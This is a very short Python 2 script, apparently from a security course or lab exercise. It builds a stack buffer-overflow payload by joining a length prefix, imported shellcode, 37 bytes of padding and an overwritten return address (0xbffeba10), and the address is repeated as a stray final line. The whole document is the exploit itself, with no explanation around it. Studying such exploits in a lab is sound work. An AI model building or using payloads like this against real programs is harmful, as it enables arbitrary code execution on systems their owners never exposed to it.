from shellcode import shellcode
print "\x01\x00\x00\x40" + shellcode +  "A"*37 + "\x10\xba\xfe\xbf"  
0xbffeba10
